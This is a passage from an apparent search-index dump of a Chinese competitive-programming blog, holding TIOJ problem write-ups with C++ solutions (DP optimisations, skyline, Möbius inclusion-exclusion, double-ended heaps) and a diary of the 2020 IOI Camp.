\u0026gt;\u0026gt; n \u0026gt;\u0026gt; k \u0026gt;\u0026gt; L; for(int i = 1; i \u0026lt;= n; i++) cin \u0026gt;\u0026gt; p[i]; ll dp = 0; deque\u0026lt;pair\u0026lt;int,ll\u0026gt;\u0026gt; dq[2]; dq[0].pb(0, 0); dq[1].pb(0, 2*(L-p[1])); for(int i = 1; i \u0026lt;= n; i++) { /*dp[i] = INF; for(int j = max(0, i-k); j \u0026lt; i; j++) { dp[i] = min(dp[i], dp[j] + min({L, 2*v[i], 2*(L-v[j+1])})); }*/ while(dq[0].front().ff \u0026lt; i-k) dq[0].pop_front(); while(dq[1].front().ff \u0026lt; i-k) dq[1].pop_front(); dp = min(dq[0].front().ss+min(L,2*p[i]), dq[1].front().ss); while(dq[0].size() \u0026amp;\u0026amp; dq[0].back().ss \u0026gt;= dp) dq[0].pop_back(); while(dq[1].size() \u0026amp;\u0026amp; dq[1].back().ss \u0026gt;= dp+2*(L-p[i+1])) dq[1].pop_back(); dq[0].pb(i, dp); dq[1].pb(i, dp+2*(L-p[i+1])); } return dp; /* dp[i] = min(dp[j] + min(L, 2*v[i], 2*(L-v[j])); dp[i] = min(dp[j] + min(a[i], b[j])) = min(min(dp[j])+a[i], min(dp[j]+b[j])); */ } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int t; cin \u0026gt;\u0026gt; t; while(t--) cout \u0026lt;\u0026lt; solve() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2020/02/20/TIOJ-1884/","tags":["TIOJ","IOI"],"title":"TIOJ-1884"},{"contents":"控控控之蘿莉控 https://tioj.ck.tp.edu.tw/problems/1828\nDescription 你走在路上遇到了一個可愛小蘿莉，因為你的控屬性，所以你跑上去問了她的名字：「小妹妹～你叫什麼名字啊？」\n她回答：「啊！！！你幹嘛！我不認識你啊你誰啊！！！」\n你：「我是你的好哥哥，來和我一起玩吧～」\n這時機智的小妹妹拿起手機打了110\n你決定要趕快逃跑，以免進入暗無天日的深淵\n於是問題來了！\n你要跑多快才不會被抓(你只能跑整數的速度)？\n因為警察的體力有限，不能跑超過警局外的$10000$單位距離，所以逃出$10000$單位距離就好了\n第一行有一個整數$T$代表測資筆數，\n每行有三個無號整數$X,Y,Z$\n$X$代表你現在跟警察局的距離，\n$Y$代表小妹妹跟警察叔叔還要在$Y$秒才會講完電話，\n$Z$代表講完電話後警察會馬上用秒速$Z$的速度沖上來追你\n$0 \\leq X,Y,Z \\leq 10^6$\n如果講完電話後，你還待在警察局門口，是會被抓的喔\n注意你站在距警察局恰$10000$單位距離的點上也還是會被抓的喔\n請輸出ㄧ個整數代表你至少要用多少的體力才不會被追悼\n如果不管怎麼樣都會被追到請輸出 -1\nSolution 是個大特判題呢\n唯ㄧ會出現 -1 的case就是$X=Y=0$的時候，也就是ㄧ開始就被追上\n首先可以知道人和警察兩個直線的差會與時間成線性\n所以最小的差肯定是出現在端點\n我們僅需要考慮剛出發那一刻和警察跨過$10000$那一刻，是否有被警察超前過即可\n假設$T$是距離講完電話過了$T$秒，並且逃跑的速度是$V$\n那麼可以列出式子\n$$\nX + (Y+T)V \u0026gt; TZ\n$$\n當$T$是$0$，可以知道$V$的最小值不是$0$就是$1$，取決於$X,Y$是否為0\n當警察跨過$10000$時，$T=10000/Z$，移項一下可以得到$V \u0026gt; \\frac{(10000-X)Z}{YZ+10000}$\n不過注意$Z$必須不為$0$，若$Z$為$0$可以直接特判掉\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;cstdio\u0026gt; typedef long long ll; const int L = 10000; int solve() { int x, y, z; scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;x, \u0026amp;y, \u0026amp;z); if(x == 0 \u0026amp;\u0026amp; y == 0) return -1; if(x \u0026gt; L) return 0; if(!z) return !x; return (L-x) * ll(z) / (ll(z)*y + L) + 1; /* X + (Y+T)V \u0026gt; min(10000, TZ) X + (Y+T)V \u0026gt; TZ XZ + (YZ+TZ)V \u0026gt; TZZ consider T == 10000/Z and T == 0 V \u0026gt; (10000-X)Z / (ZY+10000) X + YV \u0026gt; 0 */ } signed main() { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while(t--) printf(\u0026#34;%d\\n\u0026#34;, solve()); return 0; } ","permalink":"https://omeletwithoutegg.github.io/2020/02/20/TIOJ-1828/","tags":["TIOJ"],"title":"TIOJ-1828"},{"contents":"B-Game https://tioj.ck.tp.edu.tw/problems/1553\nDescription B-Game是個殘酷的兩人卡片對戰遊戲(Battle Game)\n檯面上有$n$張卡片，排成環狀，每張卡片有其數值\n兩人輪流取卡片，只能選與已經取過的卡片相鄰的卡片，但第一個人不受此限\n選完卡片之後，勝負決定在將兩人手中卡片的數值和\n若某位玩家得分大於另一位玩家，無論大多少均是勝利\n輸出一行包含兩個數\n分別是一開始有幾種拿法可以讓先拿的人勝利\n與先拿的人最多可以拿到多少\nSolution 一開始我沒有注意到環型的條件，送了好多次假解XD\n後面還忘記%n，WA到癱軟www\n現在假設先手第一步取了某張卡\n則剩下的卡片就是環上的一段連續區間，並且不管怎麼拿都會一直保持是連續區間\n可以透過奇偶性知道最後一步輪到誰拿，且拿的位置肯定是區間的最左邊或是最右邊\n而對手ㄧ定會讓自己分數最低，我們則是讓分數盡量高\n因此可以列出簡單的2D/0D轉移式，得到每個區間可以從兩頭拿時先手的最高得分\n再加上先手第一步取得的分數就可以知道從每個地方起手先手所能得到的最高分\n也就知道在那個位置是否有機會勝利了\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026lt;cstdio\u0026gt; inline int min(int a, int b) {return a\u0026lt;b?a:b;} inline int max(int a, int b) {return a\u0026gt;b?a:b;} const int N = 225; int n, v[N], dp[N][N], sum, cnt, mx = 0; signed main() { scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for(int i = 0; i \u0026lt; n; i++) scanf(\u0026#34;%d\u0026#34;, v+i); for(int i = 0; i \u0026lt; n; i++) sum += v[i]; for(int L = 1; L \u0026lt;= n-1; L++) { for(int i = 0; i \u0026lt; n; i++) { if(n-L \u0026amp; 1) { dp[i][L] = min(dp[i][L-1], dp[(i+1)%n][L-1]); }else { dp[i][L] = max(dp[i][L-1]+v[(i+L-1)%n], dp[(i+1)%n][L-1]+v[i]); } //cout \u0026lt;\u0026lt; dp[i][L] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; } //cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } //for(int i = 0; i \u0026lt; n; i++) cout \u0026lt;\u0026lt; v[i]+dp[(i+1)%n][n-1] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; //debug(sum); for(int i = 0; i \u0026lt; n; i++) { int t = v[i]+dp[(i+1)%n][n-1]; if(t \u0026gt; mx) mx = t; if(t \u0026gt; sum-t) ++cnt; } printf(\u0026#34;%d %d\\n\u0026#34;, cnt, mx); } ","permalink":"https://omeletwithoutegg.github.io/2020/02/19/TIOJ-1553/","tags":["TIOJ","dp"],"title":"TIOJ-1553"},{"contents":"[純屬無聊] Tie Breaker https://tioj.ck.tp.edu.tw/problems/1274\nDescription 本題考驗你對小向的試煉題敘的理解程度。請回答以下三個問題：\n假設2-2的圖來自遊戲「甲」(一個包含五個字母的單字)，2-3的圖來自動畫「乙」(一個包含九個字母的單字 ，請問甲和乙中字母e出現幾次？ 假設3-1的圖來自動畫「丙」(包含四個中文字)，3-3的圖來自漫畫「丁」(包含六個中文字) ，請問丙和丁中聲調為二聲的字有幾個？ 假設4-1的圖來自動畫「戊」(包含八個中文字，其中第五個字是三聲)，4-2的圖來自動畫「己」(包含四個中文字)，4-3的圖來自動畫「庚」(包含六個中文字) ，且令為己的前兩個字翻譯成英文後的字母數，為戊的第二個字所代表的數字 ，「辛」是「庚」的第一個字。請問「辛」倍的x+y是幾？ Solution 註: 小向的試煉是TIOJ上一系列的題目，可以自行搜尋\n甲 = Deemo 乙 = charlotte\n第一點的答案 = 3\n丙 = 遊戲人生 丁 = 我的英雄學院\n第二點的答案 = 4\n戊 = 中二病也想談戀愛 己 = 東京闇鴉 庚 = 雙星之陰陽師\n第三點的答案 = 2 * (5 + 2) = 14\n這題是考驗油度或是google程度，不過casper用猜的猜出答案，好糟糕\nAC code 1 2 3 4 5 6 #include \u0026lt;cstdio\u0026gt; int main() { int ans[4] = {-1, 3, 4, 14}, n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); printf(\u0026#34;%d\\n\u0026#34;, ans[n]); } ","permalink":"https://omeletwithoutegg.github.io/2020/02/16/TIOJ-1274/","tags":["TIOJ"],"title":"TIOJ-1274"},{"contents":"Problem A. 雷射防護網 https://tioj.ck.tp.edu.tw/problems/1511\nDescription 考慮在正$n$邊形的頂點中任選三點形成的三角形，請統計分別有幾個銳角三角形、直角三角形和鈍角三角形\n注意：兩個三角形被視為不同的，若且唯若三個頂點的編號不完全相同，並且不可以旋轉三角形\n$n \\leq 10^6$\nSolution 簡單排列組合，不過我寫好久還踩到一些坑\n直角的case很容易解決，因為斜邊必須要是外接圓的直徑，故$n$得是偶數\n而所有$n/2$條直徑對應的直角三角形個數就是$2(n/2-1)$\n接著我們先計算鈍角的case\n固定鈍角那個頂點，假設三個角的角度分別等於$a, b, c$個邊(因為是正多邊形所以可以這樣統計)，且$a \u0026gt; b,c$\n那麼所有鈍角三角形的個數就等於$a+b+c = n$且$a \u0026gt; n/2$的正整數解的個數\n此時枚舉$a$，$b+c=n-a$有$n-a-1$組正整數解，可以知道所求即是\n$$\n\\sum _ {a = \\left \\lfloor n/2 \\right \\rfloor + 1} ^ {n-2} n-a-1 = \\sum _ {i=1}^{n-2 - \\left \\lfloor n/2 \\right \\rfloor} i = \\frac{(n-2 - \\left \\lfloor n/2 \\right \\rfloor) (n-2 - \\left \\lfloor n/2 \\right \\rfloor + 1)}{2}\n$$\n記得要乘上$n$，代表以每個頂點當作鈍角頂點\n又所有三角形的個數就是$\\binom{n}{3} = \\frac{n(n-1)(n-2)}{6}$\n扣掉直角及鈍角的個數就是銳角的個數了\n這裡比較慘的是雖然題目的範圍似乎不會讓答案超過 long long\n但計算所有三角形個數的時候可能會溢位\n因此在計算銳角三角形時我先把一個$n/3$提出來，再想辦法好好約分\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef int64_t ll; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); ll n; string s, _; while(cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; s \u0026gt;\u0026gt; _) { ll h = n/2; // half ll right = n\u0026amp;1 ? 0 : n*(h-1); ll tmp = n-2-h; ll obtuse = tmp*(tmp+1)/2*n; // (# a + b + c = n, max(a,b,c) \u0026gt; n/2) // (sum _ {a = n/2+1}^{n-2} n-a-1) = sum _ {i=1}^{n-2-n/2} i // tot = n*(n-1)*(n-2)/6 ll acute = (n-1)*(n-2)/2 - tmp*(tmp+1)/2*3; if(n%3 == 0) acute *= n/3; else acute /= 3, acute *= n; acute -= right; if(s[0] == \u0026#34;Right\u0026#34;[0]) cout \u0026lt;\u0026lt; right \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else if(s[0] == \u0026#34;Acute\u0026#34;[0]) cout \u0026lt;\u0026lt; acute \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else if(s[0] == \u0026#34;Obtuse\u0026#34;[0]) cout \u0026lt;\u0026lt; obtuse \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/02/15/TIOJ-1511/","tags":["TIOJ","math"],"title":"TIOJ-1511"},{"contents":"重疊的天際線 https://tioj.ck.tp.edu.tw/problems/1202\nDescription 地平線上有許多房子，而這些房子在夕陽的照射之下形成有趣的輪廓，我們稱之為天際線(Skyline)。為了方便起見，你可以假設所有的房子都是一個位在2D平面上的矩形，並且有一條邊貼在這個假想2D平面上的X軸。\n一棟建築可以用三元數組$(L_i, H_i, R_i)$來表示，依序代表該建築物的左界座標、高度、右界座標。\n下圖中的八棟建築就是用此方法表示就是\n$(1,11,5), (2,6,7), (3,13,9), (12,7,16), (14,3,25), (19,18,22), (23,13,29), (24,4,28)$。\n一個天際線也可以用類似的「X-遞增序列」表示出來，例如上面的八棟建築合併之後上方右圖的天際線可表示為：\n$(1, 11, 3, 13, 9, 0, 12, 7, 16, 3, 19, 18, 22, 3, 23, 13, 29, 0)$\n請你寫一個程式，給你這些房子的位置，請你把它們形成的天際線描述出來。\n對於每一筆測試資料，請按照題目以及範例輸出格式輸出天際線的樣子。\n請注意，最後一個數字一定是0。也請不要輸出多餘空白。\nSolution 考慮所有矩形的邊界上的點，我們只要確定這些點的最大高度就能夠描述這個天際線\n更進一步的話題目要求的格式甚至只需要考慮左界這個點\n因此我們維護一個 multiset\n從左到右考慮所有邊界，對於任一個建築物的高度$H$，都在$L$的時候加進 multiset 裡面然後在$R$的時候刪掉\n如果這個點的高度和前一次的答案一樣就不需要加進答案裡面\n注意輸出格式QQ，一開始還吃WA好幾次\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #include \u0026lt;bits/stdc++.h\u0026gt; #define ff first #define ss second #define pb emplace_back using namespace std; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n; while(cin \u0026gt;\u0026gt; n \u0026amp;\u0026amp; n) { map\u0026lt;int, array\u0026lt;vector\u0026lt;int\u0026gt;,2\u0026gt;\u0026gt; mp; multiset\u0026lt;int\u0026gt; ms{0}; vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; ans; for(int i = 0; i \u0026lt; n; i++) { int L, H, R; cin \u0026gt;\u0026gt; L \u0026gt;\u0026gt; H \u0026gt;\u0026gt; R; mp[L][0].push_back(H); mp[R][1].push_back(H); } for(const auto \u0026amp;V: mp) { int p = V.ff; const auto \u0026amp;in = V.ss[0]; const auto \u0026amp;ou = V.ss[1]; for(int h: in) ms.insert(h); for(int h: ou) ms.erase(ms.find(h)); int H = *--ms.end(); if(ans.empty() || ans.back().ss != H) ans.pb(p,H); } for(int i = 0; i \u0026lt; ans.size(); i++) cout \u0026lt;\u0026lt; ans[i].ff \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; ans[i].ss \u0026lt;\u0026lt; (i+1 == ans.size() ? \u0026#39;\\n\u0026#39; : \u0026#39; \u0026#39;); } } ","permalink":"https://omeletwithoutegg.github.io/2020/02/09/TIOJ-1202/","tags":["TIOJ","data-structure"],"title":"TIOJ-1202"},{"contents":"5.高中運動會 https://tioj.ck.tp.edu.tw/problems/1156\nDescription 夢幻城市每年為全市高中生舉辦一次運動大會。為促進各校同學之間的交流，採用特別的分隊方式：每一個學校的同學，必須被均勻分散到各隊，使得每一隊中該校的人數皆相同。為增加比賽的競爭性，希望分成越多隊越好。你的任務是由各校的人數，決定最多可分成的隊數。\nSolution 沒想到全國賽竟然有這麼水的題目XDD，題目所求就是所有學校人數的最大公因數\n用 __gcd 就足夠了，不過我覺得這份code寫起來很簡短所以我想貼出來ouo，順便加了個輸入優化\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;cstdio\u0026gt; inline char readchar() { constexpr int B = 1\u0026lt;\u0026lt;20; static char buf[B], *p, *q; if(p == q \u0026amp;\u0026amp; (q=(p=buf)+fread(buf,1,B,stdin)) == buf) return EOF; return *p++; } inline int nextint() { int x = 0, c = readchar(); while(c \u0026lt; \u0026#39;0\u0026#39;) c = readchar(); while(c \u0026gt;= \u0026#39;0\u0026#39;) x=x*10+(c^\u0026#39;0\u0026#39;), c=readchar(); return x; } int gcd(int a, int b) { while(int t = b) b = a%b, a = t; return a; } signed main() { int n = nextint(), g = 0; while(n--) g = gcd(g, nextint()); printf(\u0026#34;%d\\n\u0026#34;, g); } ","permalink":"https://omeletwithoutegg.github.io/2020/02/08/TIOJ-1156/","tags":["TIOJ"],"title":"TIOJ-1156"},{"contents":"爆炸吧現充~ https://tioj.ck.tp.edu.tw/problems/1600\nDescription 求共有幾個滿足\n$$\n1 \\leq x \\leq n,\n\\exists k \u0026gt; 1, k^2 | x\n$$\n的$x$\nSolution 一開始我的想法是$[\\mu(x)=0]$的前綴，想說用杜教篩或莫比烏斯反演什麼的，但怎麼推都推不出來\n去問王政祺之後，他說直接枚舉平方數再排容就好，至於排容的係數就直接取$\\mu$\n令\n$$\nS_k = \\{x | 1 \\leq x = k^2t \\leq n\\}\n$$\n則答案就是\n$$\n\\begin{matrix}\n|\\bigcup _ {k} S_k| \u0026amp;= \u0026amp; (|S_2| + |S_3| + |S_5| + |S_7| + \\cdots)\\newline\n\u0026amp;- \u0026amp; (|S_6|+|S _ {10}|+|S _ {14}|+|S _ {15}|+ \\cdots)\\newline\n\u0026amp;+ \u0026amp; (|S _ {30}|+|S _ {42}|+|S _ {66}|+|S _ {70}|+ \\cdots)\\newline\n\u0026amp; \u0026amp; \\vdots\\newline\n\u0026amp;= \u0026amp; \\sum -\\mu(k) |S_k|\\newline\n\u0026amp;= \u0026amp; -\\sum\\limits _ {k=2}^\\sqrt{n} \\mu(k) \\frac{n}{k^2}\n\\end{matrix}\n$$\n依照不同質因數去分類，可以發現排容的正負號和$\\mu$一致(我也不太會證明最後的部分QQ)\n看來我的思維要再靈活一些 \u0026gt; \u0026lt;\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long ll const ll N = 1000025; int mu[N],np[N]; vector\u0026lt;int\u0026gt; prs; signed main() { mu[1] = np[1] = 1; for(int i = 2; i \u0026lt; N; i++) { if(!np[i]) prs.push_back(i), mu[i] = -1; for(int p: prs) { if(i*p \u0026gt;= N) break; np[i*p] = 1; if(i%p) { mu[i*p] = -mu[i]; }else { mu[i*p] = 0; break; } } } ll ans = 0, n; while(cin \u0026gt;\u0026gt; n) { ans = 0; for(ll i = 2; i*i \u0026lt;= n; i++) ans -= n / (i*i) * mu[i]; cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/01/26/TIOJ-1600/","tags":["TIOJ","math"],"title":"TIOJ-1600"},{"contents":"\u0026lt;! \u0026ndash; ### Author: Sean Liu \u0026ndash;\u0026gt;\n超大畫框設置 https://tioj.ck.tp.edu.tw/problems/1283\nDescription 在一個「漸進式框架」當中，你想要找到一個最大面積的矩形位置放置你最喜愛的一幅畫。\n當然地，畫框必須掛正，所以矩形的四個邊都必須與框架的邊平行或垂直。\n所謂的「漸進式框架」，指的是任何一個水平線截出的框架區段是連續，並且由上往下該區段只會往右移動，如下圖\nSolution 這個是蕭梓宏在超級久之前講的四邊形優化題目，筆者發現已經過了一年多了還沒AC就想說來寫看看好了！這一題不難想到，對於每一個在下面的線，都計算是哪一條在上面的線和它搭配會有最佳，再取$\\max$就好了。不過，這樣需要$O(MN)$的時間，頗爛。\n不過呢，還可以觀察（且證明）一個性質，就是：倘若$L(x)$為下面的線中第$x$條線所對應到的最佳（面積最大）的上面的線的編號，則$L(x + 1) \\geq L(x)$！有了這個性質，大概就可以維護一個deque，裡面放一堆東西$(L, R, I)$來維護說：上面第$I$條線可以轉移下面第$L$到第$R$的線為最佳。一開始只有一個$(0, M, 0)$，然後每次進來一個上面的線段就開始判斷（假設目前deque中最後面的元素為$(L, R, I)$，且目前我在第$X$條）：\n若$X$和$L$的矩形比$I$和$L$的矩形還大，這代表$(L, R, I)$這個區間可以完全不要了，pop掉 若$X$和$M - 1$的矩形比$I$和$M - 1$的矩形還小（也就是最後一個），則代表我永遠贏不了那一條線，我就直接break了，反正贏不了 否則，開始二分搜說我到哪裡可以贏$(L, R, I)$，也就是說，找一個最小的$m$使得$m$和$I$的矩形小於或等於$m$和$X$的矩形 維護完之後，再掃一次$M$條線取$\\max$就好了！\nAC code 感覺寫完到AC的時間還不會很久，但是中間有一堆小細節被卡（還有二分搜寫錯、被卡long long、$N, M$要除以二、面積計算出錯等有趣環節），幸好沒有太大的問題！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 #include \u0026lt;iostream\u0026gt; #include \u0026lt;deque\u0026gt; #define int long long int #define ericxiao ios_base::sync_with_stdio(0);cin.tie(0); using namespace std; const int maxN = 1e5; struct Line{ int h, l, r; Line(){} Line(int h, int l, int r): h(h), l(l), r(r){} } line, ups[maxN], downs[maxN]; struct Seg{ int l, r, id; /* l, r: from 0 ~ M - 1, bottom id: 0 ~ N - 1, top */ Seg(){} Seg(int l, int r, int id): l(l), r(r), id(id){} } current; inline int Abs(int x){ return (x \u0026lt; 0) ? -x : x; } inline int area(Line u, Line d){ return (u.r - d.l) * (d.h - u.h); //Don\u0026#39;t ABS here :( } deque\u0026lt;Seg\u0026gt; trans; int N, M, r, d, cx, cy; signed main(){ ericxiao; cin \u0026gt;\u0026gt; N; N /= 2; cx = cy = 0; for(int i = 0; i \u0026lt; N; i++){ // - | - | cin \u0026gt;\u0026gt; r \u0026gt;\u0026gt; d; ups[i] = Line(cy, cx, cx + r); cx += r; cy += d; } cin \u0026gt;\u0026gt; M; M /= 2; cx = cy = 0; for(int i = 0; i \u0026lt; M; i++){ // | - | - | - | - cin \u0026gt;\u0026gt; d \u0026gt;\u0026gt; r; downs[i] = Line(cy + d, cx, cx + r); cx += r; cy += d; } for(int i = 0; i \u0026lt; N; i++){ while(trans.size()){ int id = trans.back().id; if(area(ups[id], downs[trans.back().l]) \u0026lt;= area(ups[i], downs[trans.back().l])) trans.pop_back(); else break; } if(trans.size()){ int id = trans.back().id, L = trans.back().l, R = trans.back().r, MID; if(area(ups[id], downs[M - 1]) \u0026gt; area(ups[i], downs[M - 1])) continue; while(L + 1 \u0026lt; R){ MID = (L + R) / 2; if(area(ups[id], downs[MID]) \u0026lt;= area(ups[i], downs[MID])) R = MID; else L = MID; } trans.back().r = L; trans.push_back(Seg(L, M, i)); } else { trans.push_back(Seg(0, M, i)); } } int ans = 0; for(int i = 0; i \u0026lt; M; i++){ while(trans.size() \u0026amp;\u0026amp; trans.front().r \u0026lt;= i) trans.pop_front(); ans = max(ans, area(ups[trans.front().id], downs[i])); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; } ","permalink":"https://omeletwithoutegg.github.io/2020/01/25/TIOJ-1283/","tags":["TIOJ","dp","dp-optimization"],"title":"TIOJ-1283"},{"contents":"2020 IOIC 小記 五天都11點回家 好累喔\n不過聽到很多神奇技巧和神奇題目(?)\nDay 1 早上是常數優化與電腦結構，看到一些毒瘤的東東還有會造成我常數大的一些寫法\n中午有貓貓時間，電仁分享了他競程的心得之後，丟給我們一些題目\n可是我幾乎都不會做QQ\n下午塗大為的DP\u0026amp;圖論，速度超快的www趕火車\n聽到有點快要睡著，超難\n晚上趣味賽有一個隊友還沒來QQ，不過這種類型的題目真棒\n空白、tab和換行不算edit distance的規則沒有想到能讓註解佔了好多除蟲題的名額XD\nDay 2 資料結構初階OwO!\n直接從前一天下午的惡夢變成舒適的溫水浴，於是我決定自己翻講義刷題\n可是圖論超煩躁，DP我也不會SCC我也一直寫爛，搞了快半天AC不了半題WTF\n最後還被卡記憶體，直接怒不寫了QQ\n下午原本是數學被換成根號算法，因為蔣立元有講過蠻多的所以YP這堂還算友善(?)\n聽到很多有趣的題目，不過可惜我前一天自己看講義被捏到一些QQ\n除了2的冪次分層(不知道怎麼用)以外都蠻喜歡的\n因為分塊就是優美的暴力(O)\n第一場個人賽，實在是打的有點差\npA被我擱置，聽到解法之後覺得超顯然QQ為甚麼我賽中不開啊\n開場就碰pF，碰到結尾還AC不了，到底三小\n我已經自認locality很好了欸QAQ而且取模乘法加法都有好好寫啊 早知道就多試一點順序了\npC開的極慢，DP式一直推不出來，有夠爛，還一直亂猜加一減一吃WA吃滿\npE水題太慢看到ww在附中練習賽有寫過所以速速AC\npD樹重心，推導一下式子之後想到二分搜祖先再加上去(題解後感覺這個解超爛QQ)\npG是樹上莫隊裸題，但我不知道為甚麼沒自信寫(X)\n時間全都砸在pB，想到一個實作又臭又長的作法，花了好久實作之後TLE\n到結束沒時間再寫出一題QQ\n結束之後YP跟我說我差一點AC pB，要用degree分塊才不會爛掉(我就爛)\nDay 3 早上字串，幾乎都是聽了n遍之後已經大概知道的東西(?)\nAC前一天pB之後有點不知道要做啥\n於是我試著刻了AC自動機，參考了一下講義上的code之後傳到TIOJ 1306得到SF\n我想說是不是我空間開錯，怎麼開都會SF，看了一下其他人的AC code發現他們都開4e5\n然後我開了還是SF，後來才發現是我有地方寫錯@_@\n後面唯一覺得有興趣的後綴自動機仍然沒有聽懂(?)雖然之前在講師小莫的blog上面看過了不過還是感覺好複雜\n隨機和近似實在是不太容易通靈出來，有些只要直覺的隨便亂做多次一點就足夠AC\n但是竟然有要先自己創造另一個題目的算法XD太難啦\n團體賽總算是有了第三個隊友\npH是裸題，pI是水題，隊友找出來之後我趕緊水掉\n剩下根本找不出來甚麼題目可做XD\npD是簡單DP，可是我一直WA，還好隊友有提醒我一些鬼邊界狀況\n剩下時間花了好多開pJ，結果還漏看一個條件，而且在樹上的想法也是錯的QQ\npB以為是簡單結論題沒想到原來是奇怪的經典題(?)\npC也應該猜一猜在賽中寫出來的，有點可惜\nDay 4 電石的資結進階，除了Pattern以外都有稍微聽過(線段樹優化建圖是在某一次蕭梓宏選的virtual場看到的XD)\nCDQ分治更是直接聽電石本人講過ww\nPattern這東西好神奇喔，我想還要好久我才能通透，感覺題目再一些變化的話我就看不出來了\n下午是數學，但在上課之前出現神秘講師短短的講了Splay和LCT就不見了XD(聽說他是原本FFT的講師?)\n中堂休息之後突然就切換到數學模式，頓時有種我不會數學的感覺，明明聽過那麼多東西卻無法好好應用\n(也許我應該去精進我的數學實力? 要怎麼讀啊?)\n個人賽一開始有想法只有pB，看到Scoreboard上面大家都AC pD就猜是水結論題直接給他猜結論下去XDD\n接著花時間把pB寫掉了，雖然看到一些人在丟pC不過沒什麼想法，反而翻到pE是今天電石上課直接講過的東西XD\n因為印象很深所以想說要自己刻出來，不過最後還是參考了一些講義的細節想法QQ\n幸運的搶到pF首殺之後發現pC其實好水，寫掉之後就沒事做了(?)\nDay 5 正式賽，長達五小時\n看著Dashboard pA pG寫掉\n接著大家都寫出了pM，隊友給我想法之後我一直瘋狂WA，賽中也看不到各個testcase的狀況，根本不知道是全錯還是edge case QQ\n第一筆submission是11:50，到12:40都還在debug，結果是測資出問題，找不到不存在的bug是理所當然QQ\n記分板上大家都寫了pK pL，但我覺得pK構造沒有甚麼想法，pL初步認為是greedy(都列出DP式了還不會算複雜度，我就爛)\npH裸題應該早點開但我沒開\npI不知道為什麼一直吃WA\npE也是前幾天講過的題目，應該要想到的\n營隊最後一場比賽打得不太好真可惜QQ\n一些忘了時間點的事情 披薩好好吃 誰那麼ㄎㄧㄤ在吃披薩的時候放佛教動起來和叫品翔唱附中校歌 每天都有nut，每天都有bug 被張程凱拉去辦了Ubike的帳戶，之後幾天都騎Ubike從捷運站到德田館 Euclidea又被翻回來玩，真的有趣 一個有點心的營隊值得給讚 開一個好的judge感覺好難，沒事就會爆炸XDD 好多人從IOIC得到感冒或流感，怕 大家都喜歡隨機，哪那麼衰 大家都同意塗大為超帥 軟軟超夯，果然可愛就是正義，每次放到桌上的軟軟都會不見qq 看到好多只有聽過的人的面孔(?) 跟國手聊天應該是最大的收穫之一，還聽到有些神奇的演算法 ","permalink":"https://omeletwithoutegg.github.io/2020/01/25/IOICamp-2020/","tags":["experience","IOIC"],"title":"IOICamp-2020"},{"contents":"進階的入門 https://tioj.ck.tp.edu.tw/problems/1168\nDescription 你需要實作五個函式：\n1 2 3 4 5 void pop_big(); void pop_small(); void push(int s); int big(); int small(); 其中第一個函式需要將最大的數字移除，第二個函式需要將最小的數字移除，第三個函式需要將一個數加入目前的數字們，第四個函式需要回傳當前的最大值，第五個函式需要回傳當前的最小值。\n假設一開始沒有任何數字，請你實作這五個操作。\n保證當沒有數字的時候只會呼叫 push ，並且加入的數字 $\\leq 10^9$ ，五個函數的總呼叫次數 $\\leq 10^6$ 。\nSolution 好久之前就一直卡這題總算AC了@_@\n最直覺的想法就是開一個multiset或map，但這題的時限超誇張的緊\n可以想到利用 priority_queue 維護最大最小\n然而假如一個數字在最大堆被pop掉，不容易在最小堆裡面把他給刪除\n我一開始的想法是開 unordered_map 之類的紀錄每個數字的個數，想當然而吃了TLE\n後來查了解才發現紀錄插入編號並且維護編號幾的被 pop 了就可以\n於是我就在 priority_queue 裡面存編號，並且自己寫compare函式\n不過這樣寫的locality很差，似乎會讓常數暴增\n改成用struct包住之後剩下最後兩筆TLE，試了好久之後才想到 priority_queue 是用 vector 實作，動態開的空間顯然會浪費很多常數，不如自己靜態開一個大陣列\n注意到 pop 操作最多就是呼叫次數的一半，所以 heap 只要開 5e5 就好了， push 